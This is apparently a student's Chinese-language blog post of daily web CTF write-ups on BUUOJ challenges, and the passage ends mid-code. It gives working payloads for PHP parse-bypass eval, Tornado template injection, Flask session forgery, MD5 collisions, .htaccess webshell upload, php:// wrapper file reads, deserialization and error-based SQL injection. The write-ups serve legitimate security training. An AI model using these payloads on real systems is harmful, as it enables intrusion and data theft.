
<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="UTF-8" />
        <title>web每日一题 | 嘉然今天学什么</title>
        <meta name="author" content="fc235" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
        <link rel="icon" href="/images/avatar.jpg" />
        <script src="https://cdn.staticfile.org/vue/3.2.47/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.3.0/css/all.min.css" />
<link rel="stylesheet" href="/css/fonts.min.css" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

    <meta name="generator" content="Hexo 6.3.0"></head>
    <body>
        <div id="layout">
            <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
            </transition>
            <nav id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <div class="desktop-menu">
        <a class="title" href="/">
            <span>嘉然今天学什么</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" @click="shouMenuItems = !shouMenuItems" v-show="shouMenuItems"></div>
        <div class="title" @click="shouMenuItems = !shouMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;嘉然今天学什么</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="shouMenuItems">
            
            <a href="/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

            <transition name="into">
            <div id="main" v-show="!loading">
                <div class="article">
    <div>
        <h1>web每日一题</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/29
        </span>
        
        <span class="category">
            <a href="/categories/CyberSecurity-Learning/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CyberSecurity Learning
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/tags/ctf/" style="color: #03a9f4">ctf</a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/web/" style="color: #ff7d73">web</a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <h2 id="Web每日一题"><a href="#Web每日一题" class="headerlink" title="Web每日一题"></a>Web每日一题</h2><p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305302203848.png" alt="3"></p>
<h3 id="2023-5-29-ACTF2020-新生赛-BackupFile"><a href="#2023-5-29-ACTF2020-新生赛-BackupFile" class="headerlink" title="2023.5.29 [ACTF2020 新生赛]BackupFile"></a>2023.5.29 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]BackupFile">[ACTF2020 新生赛]BackupFile</a></h3><p>是否查看wp：是</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305292351896.png" alt="image-20230529235100863"></p>
<p>要我找备份文件，我考虑了，www、backup、backupfile等文件名以及rar、zip后缀，但是都没有发现，用dirsearch扫目录，发现大多数都429了，但是居然扫出来一个flag.php，访问无果，应该是被解析了，猜想是文件包含，想不到于是搜了wp，发现是index.php.bak，确实没想到，大概是题做少了。下载下来看源码没想到没有文件包含</p>
<pre><code class="php">&lt;?php
include_once &quot;flag.php&quot;;

if(isset($_GET[&#39;key&#39;])) &#123;
    $key = $_GET[&#39;key&#39;];
    if(!is_numeric($key)) &#123;
        exit(&quot;Just num!&quot;);
    &#125;
    $key = intval($key);
    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
    if($key == $str) &#123;
        echo $flag;
    &#125;
&#125;
else &#123;
    echo &quot;Try to find out source file!&quot;;
&#125;
</code></pre>
<p>也是非常简单的一个代码啊，<code>intval()</code>之后只取123，所以get传入key值即得flag</p>
<h3 id="2023-5-30-RoarCTF-2019-Easy-Calc"><a href="#2023-5-30-RoarCTF-2019-Easy-Calc" class="headerlink" title="2023.5.30  [RoarCTF 2019]Easy Calc"></a>2023.5.30  <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Calc">[RoarCTF 2019]Easy Calc</a></h3><p>是否查看wp：是</p>
<p>点开题发现是个计算器，正常1+1是可以计算的，但是复杂一点的算式就无法计算了，猜想是命令执行但是有过滤</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305301053069.png" alt="image-20230530105342041"></p>
<p>看源码发现果然有过滤，同时也发现了calc.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305301054324.png" alt="image-20230530105432300"></p>
<p>进入calc.php会给出代码</p>
<pre><code class="php">&lt;?php
    error_reporting(0);
if(!isset($_GET[&#39;num&#39;]))&#123;
    show_source(__FILE__);
&#125;else&#123;
    $str = $_GET[&#39;num&#39;];
    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
    foreach ($blacklist as $blackitem) &#123;
        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) &#123;
            die(&quot;what are you want to do?&quot;);
        &#125;
    &#125;
    eval(&#39;echo &#39;.$str.&#39;;&#39;);
&#125;
?&gt; 
</code></pre>
<p>存在黑名单，试了一会发现我不会饶过，于是查看wp，发现这题要考的是php的字符串解析特性</p>
<blockquote>
<p>php将查询字符串转换为内部$_GET或者关联数组$_POST（例如&#x2F;?foo&#x3D;bar会转为Array([foo] &#x3D; &gt; “bar”)，查询字符串在解析中会将某些字符删除或用下划线替代（例如 &#x2F;?%20news[id%00&#x3D;42]会转为Array[news_id] &#x3D; &gt; 42)</p>
</blockquote>
<p>php需要将所有参数转换为有效的变量名，因此在解析查询字符串的时候，他会删除空白符，将某些字符转换为下划线，所以这里waf不让num传入字母，我们不能让waf检测出字母，所以我们可以在num前加上一个空格，在php解析时就会把这个空格给删去，但是waf因为空格检测不到num参数，所以就可以成功绕过。</p>
<pre><code class="php">/calc.php? num=a
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305301134650.png" alt="image-20230530113426629"></p>
<p>接下来直接只需要找到flag就行</p>
<pre><code class="php">var_dump(scandir(chr(47))) //&#39;/&#39;在blacklist中，所以用ascii转
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305301132639.png" alt="image-20230530113234617"></p>
<p>找到这个flagg，然后用输出flag</p>
<pre><code class="php">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
</code></pre>
<h3 id="2023-5-31-极客大挑战-2019-BuyFlag"><a href="#2023-5-31-极客大挑战-2019-BuyFlag" class="headerlink" title="2023.5.31 [极客大挑战 2019]BuyFlag"></a>2023.5.31 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BuyFlag">[极客大挑战 2019]BuyFlag</a></h3><p>是否查看wp：是</p>
<p>题目本身没什么难度，进去页面发现pay.php，打开后发现首先要是CUIT的学生，然后要有正确的密码，最后要有钱，第一步卡住了，尝试了XFF，client-ip无果，最后看wp发现是改Cookies，改完就显示要password，查看源码，发现提示，考的是弱类型比较，password直接设置为404a即可，最后带上money，却显示数字过长，这里改用科学计数法即可。</p>
<p>更改Cookies</p>
<pre><code class="http">Cookie: user=1
</code></pre>
<p>post提交</p>
<pre><code class="http">password=404a&amp;money=1e9
</code></pre>
<h3 id="2023-6-1-BJDCTF2020-Easy-MD5"><a href="#2023-6-1-BJDCTF2020-Easy-MD5" class="headerlink" title="2023.6.1 [BJDCTF2020]Easy MD5"></a>2023.6.1 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[BJDCTF2020]Easy%20MD5">[BJDCTF2020]Easy MD5</a></h3><p>是否查看wp：否</p>
<p>进入页面发现是一个查询，猜测可能是sql注入，但是题目是md5，所以可能包了一层md5，这里用<code>ffifdyop</code>来查询，这个字符串的md5后hex转ascii的前几位刚好是<code>&#39;or&#39;6</code> 正好构成永真。</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306010959709.png" alt="image-20230601095909221"></p>
<p>之后进入第二关，查看源码发现提示</p>
<pre><code class="php">$a = $GET[&#39;a&#39;];
$b = $_GET[&#39;b&#39;];
if($a != $b &amp;&amp; md5($a) == md5($b))&#123;
</code></pre>
<p>md5弱类型比较，这里我用数组可以绕过，做完看其他思路发现可以用240610708，aabg7XSs，aabC9RqS，s878926199a等md5后结果是0e开头的字符串绕过。</p>
<p>最后来到新页面，代码已给出</p>
<pre><code class="php"> &lt;?php
error_reporting(0);
include &quot;flag.php&quot;;

highlight_file(__FILE__);

if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))&#123;
    echo $flag;
&#125; 
</code></pre>
<p>是php的强比较，依然可以用数组来绕过，这里post传入</p>
<pre><code class="http">param1[]=1&amp;param2[]=2
</code></pre>
<p>这样两个md5都是null，但是相等，传入就可以可以得到flag。</p>
<p>还有一种更强的检测，就是将传入数据转为字符串，就是md5的强碰撞，看到两种方法，一种是使用软件fastcoll，直接将a拖入即可得到msg1和2，然后读取12中即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306011009918.png" alt="image-20230601100958482"></p>
<p>还有一种是将hex字符串转化为ascii字符串，并写入到bin文件,然后再读取，payload：</p>
<pre><code class="http">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&amp;
b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
</code></pre>
<p>他们的md5值是相等的，考虑到要将一些不可见字符传到服务器，这里使用url编码。</p>
<h3 id="2023-6-2-护网杯-2018-easy-tornado"><a href="#2023-6-2-护网杯-2018-easy-tornado" class="headerlink" title="2023.6.2 [护网杯 2018]easy_tornado"></a>2023.6.2 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado">[护网杯 2018]easy_tornado</a></h3><p>是否查看wp：是</p>
<p>进入题目给出三个页面，点击进入后url传入两个参数，一个是filename还有一个是filehash</p>
<pre><code class="html">/flag.txt
flag in /fllllllllllllag

/welcome.txt
render

/hints.txt
md5(cookie_secret+md5(filename))
</code></pre>
<p>flag告诉我们知道flag的位置，尝试将url中&#x2F;flag替换为&#x2F;fllllllllllllag，会提示Error</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306022103618.png" alt="image-20230602210349825"></p>
<p>welcome一开始没看懂，后来知道是提示用了render函数，hints则是提示我们url后面的filehash是如何得到的，那么想知道得知道cookie_secret，结合题目的tornado，搜索得知这题是模板注入，可是我还没学到这个东西，直接看wp学习一下。</p>
<p>先找到注入点，测试一些简单的测试用例</p>
<blockquote>
<p>简单的数学表达式，<code>&#123;&#123; 7+7 &#125;&#125; =&gt; 14</code><br>字符串表达式 <code>&#123;&#123; "ajin" &#125;&#125; =&gt; ajin</code></p>
</blockquote>
<p>前面那个Error的地方就很有可能是注入点。尝试简单的数字1可以，但是如果有符号、字符串或者是命令执行</p>
<blockquote>
<p><code>&#123;% import os %&#125;&#123;&#123; os.popen("whoami").read() &#125;&#125;</code></p>
</blockquote>
<p>那就会提示orz了，猜测可能是被过滤。最后测试发现只有.没有被过滤。</p>
<blockquote>
<p>tornado.web.Application.settings：传递给构造函数的其他关键字参数保存在settings字典中，并且通常在文档中称为“应用程序设置”。其中就有cookie_secret</p>
</blockquote>
<p>可以访问到cookie_secret的函数有：<code>RequestHandler.get_secure_cookie</code>、<code>RequestHandler.settings</code>、<code>self.application.settings</code>、<code>get_secure_cookie</code>。前三个没有被过滤但是需要用实例化的对象调用函数去访问，而handler就是处理当前页面的HTTP请求的RequestHandler对象，直接访问</p>
<pre><code class="http">error?msg=&#123;&#123;handler.settings&#125;&#125;
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306022323879.png" alt="image-20230602232321462"></p>
<p>获得cookie_secret:65e41e0a-cee7-48ac-95cf-49c2bb20da0b</p>
<p>之后按照hints中内容先对文件名进行md5计算，之后再对拼接后的字符串进行MD5计算，得到的即为文件哈希</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306022325959.png" alt="image-20230602232550782"></p>
<p>之后可以尝试访问该文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306022327952.png" alt="image-20230602232729671"></p>
<p>得到flag</p>
<h3 id="2023-6-3-HCTF-2018-admin"><a href="#2023-6-3-HCTF-2018-admin" class="headerlink" title="2023.6.3 [HCTF 2018]admin"></a>2023.6.3 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HCTF%202018]admin">[HCTF 2018]admin</a></h3><p>是否查看wp：是</p>
<p>打开题目是一个文章发布平台，查看源码发现提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306031436806.png" alt="image-20230603143600494"></p>
<p>然后有登陆注册页面，尝试注册一个用户进去先看看，发现有文章发布和更改密码界面，猜测可能是sql注入或者二次注入，发布文章部分无法查看，注册时含有特殊符号会直接报错，所以应该不是sql注入。用burp抓包发现cookies中有session部分，猜测可能是session伪造，但是不知道secret_key，猜了几个也不对，看wp才发现漏了提示，在修改密码页面查看页面源代码会给出一个github的地址，里面存着源码</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306031520309.png" alt="image-20230603152013258"></p>
<p>但是这个地址已经没了，有人保存在了<a target="_blank" rel="noopener" href="https://github.com/Wkh19/hctf_flask/">这里</a></p>
<p>在<code>__init__.py</code>中可以看到这里用了flask框架，果然就是session伪造了，大致翻一遍代码之后可以找到&#x2F;app&#x2F;templates&#x2F;index.html下有这么一些代码</p>
<pre><code class="html">&#123;% include('header.html') %&#125;
&#123;% if current_user.is_authenticated %&#125;
<h1 class="nav">Hello &#123;&#123; session['name'] &#125;&#125;</h1>
&#123;% endif %&#125;
&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;
<h1 class="nav">hctf&#123;xxxxxxxxx&#125;</h1>
&#123;% endif %&#125;
&lt;!-- you are not admin --&gt;
&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;
</code></pre>
<p>可知，这里需要我们将session的name字段构造成admin</p>
<p>然后在&#x2F;app&#x2F;config.py中可以找到secret_key</p>
<pre><code class="python">import os

class Config(object):
    SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;
    SQLALCHEMY_DATABASE_URI = &#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;
    SQLALCHEMY_TRACK_MODIFICATIONS = True
</code></pre>
<p>利用<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">fscm</a>解密修改name字段，之后重新加密回去</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306031525664.png" alt="image-20230603152551664"></p>
<p>得到的session在浏览器中设置，返回index页面即可得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306031527477.png" alt="image-20230603152722299"></p>
<p>本题除此以外还有Unicode欺骗，条件竞争等方法，都对代码审计有一定要求。</p>
<h3 id="2023-6-4-MRCTF2020-你传你🐎呢"><a href="#2023-6-4-MRCTF2020-你传你🐎呢" class="headerlink" title="2023.6.4 [MRCTF2020]你传你🐎呢"></a>2023.6.4 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2">[MRCTF2020]你传你🐎呢</a></h3><p>是否查看wp：是</p>
<p>这道题印象中之前做过，所以尝试了上传一些东西，不知道为什么上传正常图片也会被拦截，但是上传一句话木马的时候修改content-type和文件后缀名是可以上传的，但是无法被解析，单独修改content-type会被检测到，尝试多种后缀都不行，猜测可能是黑白名单，尝试上传.htaccess空文件，成功。但是忘了内容怎么写。。所以去看了wp，这里正好记录一下</p>
<pre><code class="htaccess">&lt;FilesMatch &quot;ant&quot;&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>这里是将文件名中带有ant字样的文件全部按照php解析，还有一种写法是</p>
<pre><code class="htaccess">AddType application/x-httpd-php .png
</code></pre>
<p>这里将png解析为php</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306041500437.png" alt="image-20230604145954492"></p>
<p>修改content-type后就可以上传了，同样再将一句话🐎传上去</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306041507538.png" alt="image-20230604150716485"></p>
<p>获取路径后用shell工具进行连接，flag就在根目录下</p>
<h3 id="2023-6-5-ZJCTF-2019-NiZhuanSiWei"><a href="#2023-6-5-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="2023.6.5 [ZJCTF 2019]NiZhuanSiWei"></a>2023.6.5 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ZJCTF%202019]NiZhuanSiWei">[ZJCTF 2019]NiZhuanSiWei</a></h3><p>这题考查的是php伪协议与反序列化，给出了代码</p>
<pre><code class="php">&lt;?php  
    $text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
$password = $_GET[&quot;password&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;
    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
    if(preg_match(&quot;/flag/&quot;,$file))&#123;
        echo &quot;Not now!&quot;;
        exit(); 
    &#125;else&#123;
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    &#125;
&#125;
else&#123;
    highlight_file(__FILE__);
&#125;
?&gt; 
</code></pre>
<p>首先看第一个需要传入的text参数，需要被设置且调用<code>file_get_contents()</code>读取文件中内容，我第一反应是需要在服务器上放一个文件，内容是 welcome to the zjctf，但是觉得不太可能这么考，看了之后才想起来可以用php的伪协议data:&#x2F;&#x2F;，可以构造</p>
<pre><code class="htthp">?text=data://text/plain,welcome to the zjctf
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306051732481.png" alt="image-20230605173205451"></p>
<p>之后看第二个参数file，这里是文件包含，但是flag被过滤了，不能直接去访问，看到有提示useless.php，于是尝试包含它，之后发现因为被解析了什么都没有，所以应该先base64编码读文件</p>
<pre><code class="html">?file=php://filter/convert.base64-encode/resource=useless.php
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306051732057.png" alt="image-20230605173245026"></p>
<p>读取到文件之后用base64解码，获得useless.php的源码</p>
<pre><code class="php">&lt;?php  

class Flag&#123;  //flag.php  
    public $file;  
    public function __tostring()&#123;  
        if(isset($this-&gt;file))&#123;  
            echo file_get_contents($this-&gt;file); 
            echo &quot;&lt;br&gt;&quot;;
        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
        &#125;  
    &#125;  
&#125;  
?&gt;  
</code></pre>
<p>这里一个类反序列化直接给file赋值就行</p>
<pre><code class="php">&lt;?php  
class Flag&#123;  //flag.php  
    public $file = &quot;flag.php&quot;;  
    public function __tostring()&#123;  
        if(isset($this-&gt;file))&#123;  
            echo file_get_contents($this-&gt;file); 
            echo &quot;&lt;br&gt;&quot;;
        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
        &#125;  
    &#125;  
&#125;  
echo serialize(new Flag());
</code></pre>
<p>得到结果O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
<p>最后传入payload：</p>
<p><code>?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306051740188.png" alt="image-20230605174017012"></p>
<p>查看源码即可得到flag</p>
<h3 id="2023-6-6-极客大挑战-2019-HardSQL"><a href="#2023-6-6-极客大挑战-2019-HardSQL" class="headerlink" title="2023.6.6 [极客大挑战 2019]HardSQL"></a>2023.6.6 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL">[极客大挑战 2019]HardSQL</a></h3><p>跟之前做的sql差不多，这次开始尝试发现是应该是黑名单，fuzz后发现一些常用的关键字都被屏蔽了</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061431006.png" alt="image-20230606143116441">比如and，空格，union，sleep等，看下来报错注入的几个函数如updatexml，extractvalue，floor都还在，应该可以用报错注入，尝试绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061413649.png" alt="image-20230606141333756"></p>
<h4 id="先复习一下报错注入"><a href="#先复习一下报错注入" class="headerlink" title="先复习一下报错注入"></a>先复习一下报错注入</h4><p>在MySQL5.1版本后加入了对XML文档进行查询和修改的两个函数： <code>updatexml()</code>,<code>extractvalue()</code></p>
<p>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错。</p>
<p><code>updatexml(XML_document, Xpath_string, new_value)</code>：</p>
<ul>
<li>是一个使用不同xml标记匹配和替换xml块的函数。</li>
<li>可以改变文档中符合条件的节点的值</li>
<li>第一个参数是xml文档对象的名称，第二个参数是Xpath格式的路径，第三个参数是替换查找到符合条件的数据</li>
<li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
</ul>
<p>XML文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…格式，如果写入其他格式（并不是所有除了&#x2F;xxx&#x2F;xxx&#x2F;xxx的格式都会报错，有些字符会报错），会报错，并且会返回32位我们写入的非法格式内容</p>
<p>其他几个原理大致差不多，floor是为了让group by报错，我之前的文章有写。</p>
<p>回到本题中</p>
<p>首先查库</p>
<pre><code class="mysql">/check.php?username=admin&#39;or(updatexml(1,concat(1,database()),1))%23&amp;password=123 
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061522163.png" alt="image-20230606152211246"></p>
<p>然后查表</p>
<pre><code class="mysql">/check.php?username=admin&#39;or(updatexml(1,concat(1,(select(table_name)from(information_schema.tables)where(table_schema)like(database()))),1))%23&amp;password=123
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061522905.png" alt="image-20230606152231034"></p>
<p>查列</p>
<pre><code class="mysql">/check.php?username=admin&#39;or(updatexml(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27))),1))%23&amp;password=123
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061529262.png" alt="image-20230606152955203"></p>
<p>最后查数据，id没查出来，username是flag，flag就在password中，但是由于太长无法显示，所以分多次来查询</p>
<pre><code class="mysql">#前半部分
/check.php?username=admin&#39;or(updatexml(1,concat(1,(select(group_concat(password))from(H4rDsq1))),1))%23&amp;password=123
#后半部分
/check.php?username=admin&#39;or(updatexml(1,concat(1,(select(group_concat(right(password,25)))from(H4rDsq1))),1))%23&amp;password=123
</code></pre>
<p>拼接起来就是完整的flag了</p>
<h3 id="2023-6-7-MRCTF2020-Ez-bypass"><a href="#2023-6-7-MRCTF2020-Ez-bypass" class="headerlink" title="2023.6.7 [MRCTF2020]Ez_bypass"></a>2023.6.7 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[MRCTF2020]Ez_bypass">[MRCTF2020]Ez_bypass</a></h3><p>太过简单，开始给出代码</p>
<pre><code class="php">include &#39;flag.php&#39;;
$flag = &#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
if (isset($_GET[&#39;gg&#39;]) &amp;&amp; isset($_GET[&#39;id&#39;])) &#123;
    $id = $_GET[&#39;id&#39;];
    $gg = $_GET[&#39;gg&#39;];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
        echo &#39;You got the first step&#39;;
        if (isset($_POST[&#39;passwd&#39;])) &#123;
            $passwd = $_POST[&#39;passwd&#39;];
            if (!is_numeric($passwd)) &#123;
                if ($passwd == 1234567) &#123;
                    echo &#39;Good Job!&#39;;
                    highlight_file(&#39;flag.php&#39;);
                    die(&#39;By Retr_0&#39;);
                &#125; else &#123;
                    echo &quot;can you think twice??&quot;;
                &#125;
            &#125; else &#123;
                echo &#39;You can not get it !&#39;;
            &#125;

        &#125; else &#123;
            die(&#39;only one way to get the flag&#39;);
        &#125;
    &#125; else &#123;
        echo &quot;You are not a real hacker!&quot;;
    &#125;
&#125; else &#123;
    die(&#39;Please input first&#39;);
&#125;
</code></pre>
<p>按部就班一步步绕过就可以</p>
<pre><code class="http">?id[]=1&amp;gg[]=2
post传入
passwd=1234567q
</code></pre>
<h3 id="2023-6-8-网鼎杯-2020-青龙组-AreUSerialz"><a href="#2023-6-8-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="2023.6.8 [网鼎杯 2020 青龙组]AreUSerialz"></a>2023.6.8 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz">[网鼎杯 2020 青龙组]AreUSerialz</a></h3><p>一道比较简单的php反序列化题目，直接给出了代码</p>
<pre><code class="php">&lt;?php

include(&quot;flag.php&quot;);

highlight_file(__FILE__);

class FileHandler &#123;

    protected $op;
    protected $filename;
    protected $content;

    function __construct() &#123;
        $op = &quot;1&quot;;
        $filename = &quot;/tmp/tmpfile&quot;;
        $content = &quot;Hello World!&quot;;
        $this-&gt;process();
    &#125;

    public function process() &#123;
        if($this-&gt;op == &quot;1&quot;) &#123;
            $this-&gt;write();
        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
            $res = $this-&gt;read();
            $this-&gt;output($res);
        &#125; else &#123;
            $this-&gt;output(&quot;Bad Hacker!&quot;);
        &#125;
    &#125;

    private function write() &#123;
        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
                $this-&gt;output(&quot;Too long!&quot;);
                die();
            &#125;
            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
            if($res) $this-&gt;output(&quot;Successful!&quot;);
            else $this-&gt;output(&quot;Failed!&quot;);
        &#125; else &#123;
            $this-&gt;output(&quot;Failed!&quot;);
